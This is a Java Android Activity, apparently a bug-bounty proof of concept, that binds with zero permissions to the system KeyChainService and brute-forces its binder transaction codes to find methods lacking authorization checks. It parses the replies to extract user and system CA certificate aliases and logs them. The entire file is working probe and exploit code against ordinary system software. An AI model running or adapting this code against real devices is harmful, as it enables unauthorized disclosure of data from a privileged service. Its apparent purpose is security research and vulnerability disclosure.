package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

public class KeychainCaLeakActivity extends Activity {
    private static final String T = "KEYCHAIN_LEAK";
    private static final String IFACE = "android.security.IKeyChainService";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== KeyChainService unauthenticated AIDL method probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        Intent intent = new Intent(IFACE);
        intent.setComponent(new ComponentName("com.android.keychain", "com.android.keychain.KeyChainService"));

        ServiceConnection conn = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                Log.w(T, "[!!!] BOUND to KeyChainService with ZERO permissions: " + name);
                try {
                    Log.w(T, "  interface desc=" + service.getInterfaceDescriptor());
                } catch (Exception e) {
                    Log.w(T, "  desc error: " + e);
                }

                // Brute-force transaction codes with zero-arg calls (no permission needed to attempt).
                // Methods with a missing authz check (getUserCaAliases/getSystemCaAliases/etc.)
                // will return real data; guarded methods throw SecurityException inside the
                // transaction which surfaces as a non-zero exception code or RemoteException.
                for (int tx = 1; tx <= 30; tx++) {
                    tryZeroArgCall(service, tx);
                }

                try { unbindService(this); } catch (Exception e) {}
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                Log.w(T, "[x] Disconnected");
            }
        };

        try {
            boolean bound = bindService(intent, conn, Context.BIND_AUTO_CREATE);
            Log.w(T, "bindService() returned " + bound);
        } catch (SecurityException se) {
            Log.w(T, "[-] bindService SecurityException: " + se.getMessage());
        } catch (Exception e) {
            Log.w(T, "[-] bindService exception: " + e);
        }
    }

    private void tryZeroArgCall(IBinder service, int tx) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(IFACE);
            boolean ok = service.transact(tx, data, reply, 0);
            reply.setDataPosition(0);
            int exc = reply.readInt();
            if (exc == 0) {
                logSuccess(tx, reply);
            }
        } catch (Throwable e) {
            // SecurityException from Preconditions.checkCallAuthorization() on guarded
            // methods propagates here as a RemoteException/RuntimeException — expected.
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    private void logSuccess(int tx, Parcel reply) {
        int avail = reply.dataAvail();
        Log.w(T, "[+] TX" + tx + " returned WITHOUT exception, avail=" + avail);
        if (avail <= 0) return;
        int startPos = reply.dataPosition();

        // Attempt 1: parse as a ParceledListSlice<String>-shaped reply (used by
        // StringParceledListSlice, which getUserCaAliases/getSystemCaAliases return).
        try {
            reply.setDataPosition(startPos);
            int numItems = reply.readInt();
            if (numItems >= 0 && numItems < 5000) {
                int count = 0;
                StringBuilder aliases = new StringBuilder();
                for (int i = 0; i < numItems; i++) {
                    String s = reply.readString();
                    if (s == null) break;
                    aliases.append(s).append(", ");
                    count++;
                    if (count >= 25) { aliases.append("... (+" + (numItems - count) + " more)"); break; }
                }
                Log.w(T, "  [PARSED-LIST] TX" + tx + " numItems=" + numItems + " aliases=[" + aliases + "]");
            }
        } catch (Exception e) {
            Log.w(T, "  list-parse failed: " + e);
        }

        // Attempt 2: raw UTF-16LE scan of the marshalled bytes (Parcel.writeString uses UTF-16LE).
        try {
            reply.setDataPosition(startPos);
            byte[] raw = reply.marshall();
            StringBuilder cur = new StringBuilder();
            StringBuilder out = new StringBuilder();
            int i = startPos;
            while (i + 1 < raw.length) {
                int lo = raw[i] & 0xFF;
                int hi = raw[i + 1] & 0xFF;
                if (hi == 0 && lo >= 32 && lo < 127) {
                    cur.append((char) lo);
                    i += 2;
                } else {
                    if (cur.length() >= 3) out.append(cur).append(" | ");
                    cur.setLength(0);
                    i += 1;
                }
            }
            if (cur.length() >= 3) out.append(cur);
            Log.w(T, "  [UTF16-SCAN] TX" + tx + ": " + out);
        } catch (Exception e) {
            Log.w(T, "  marshall failed: " + e);
        }
        reply.setDataPosition(startPos);
    }
}
